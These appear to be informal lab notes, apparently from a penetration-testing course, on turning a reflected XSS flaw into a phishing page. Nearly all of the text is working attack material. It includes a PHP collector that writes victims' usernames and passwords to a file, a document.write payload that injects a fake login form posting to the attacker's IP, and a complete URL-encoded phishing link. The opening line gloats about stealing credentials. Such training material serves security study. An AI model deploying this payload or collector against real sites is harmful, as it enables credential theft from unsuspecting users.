LO & BEHOLD as i use this nc port to steal your creads 

As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the `dead image url` icon:

PHP Server we will use to steal data 
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Payload we send and that we well see at the full URL: 

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

After that we'll have a phishing url that will steal creds from any user who authenticates from it: 

http://10.129.201.52/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.2%3A8080%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B
